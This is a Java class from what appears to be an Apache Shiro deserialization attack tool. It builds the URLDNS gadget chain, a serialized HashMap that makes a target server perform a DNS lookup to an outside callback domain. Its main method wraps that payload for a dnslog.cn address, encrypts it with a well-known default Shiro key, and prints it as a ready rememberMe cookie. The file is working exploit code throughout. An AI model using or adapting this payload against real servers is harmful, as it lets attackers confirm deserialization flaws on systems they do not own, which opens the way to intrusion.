package com.summersec.attack.deser.payloads;

import com.summersec.attack.core.AttackService;
import com.summersec.attack.deser.frame.Shiro;
import com.summersec.attack.deser.payloads.annotation.Authors;
import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.payloads.annotation.PayloadTest;
import com.summersec.attack.deser.util.Reflections;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;



@PayloadTest(skip = "true")
@Dependencies
@Authors({"GEBL"})
public class URLDNS {
    public URLDNS() {
    }

    public Object getObject(String url) throws Exception {
        URLStreamHandler handler = new URLDNS.SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL((URL)null, url, handler);
        ht.put(u, url);
        Reflections.setFieldValue(u, "hashCode", -1);
        return ht;
    }

    public static void main(String[] args) throws Exception {
        Object dnslog = (new URLDNS()).getObject("http://c996hs.dnslog.cn");
        Shiro shiro = new Shiro();
        AttackService.aesGcmCipherType = 1;
        String sendpayload = shiro.sendpayload(dnslog, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
        System.out.println(sendpayload);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        SilentURLStreamHandler() {
        }

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}

